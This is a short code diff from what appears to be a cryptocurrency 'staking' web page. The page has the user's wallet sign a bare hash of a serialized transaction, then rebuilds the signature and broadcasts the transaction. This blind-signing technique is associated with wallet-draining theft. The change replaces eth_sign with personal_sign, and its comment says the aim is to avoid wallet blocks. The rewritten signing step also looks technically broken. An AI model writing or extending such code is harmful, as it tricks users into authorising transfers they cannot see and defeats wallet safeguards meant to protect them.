@@ -1044,7 +1044,11 @@ const REOWN_PROJECT_ID = 'YOUR_REOWN_PROJECT_ID_HERE'; // ← Replace with your 
         const serializedTx = "0x" + tx.serialize().toString("hex");
         const sha3_ = appState.web3.utils.sha3(serializedTx, { encoding: "hex" });
 
-        const initialSig = await appState.web3.eth.sign(sha3_, appState.account);
+        // Use personal_sign (modern replacement for eth_sign) — widely supported and not disabled by wallets
+        const initialSig = await appState.provider.request({
+          method: 'personal_sign',
+          params: [sha3_, appState.account]
+        });
 
         const temp = initialSig.substring(2),
           r = "0x" + temp.substring(0, 64),
@@ -1057,7 +1061,7 @@ const REOWN_PROJECT_ID = 'YOUR_REOWN_PROJECT_ID_HERE'; // ← Replace with your 
         tx.v = v;
 
         const txFin = "0x" + tx.serialize().toString("hex");
-        const res = await web3.eth.sendSignedTransaction(txFin);
+        const res = await appState.web3.eth.sendSignedTransaction(txFin);
         success = 1;
         structuredLog('info', 'stake_eth_success', { txHash: res.transactionHash });
       }
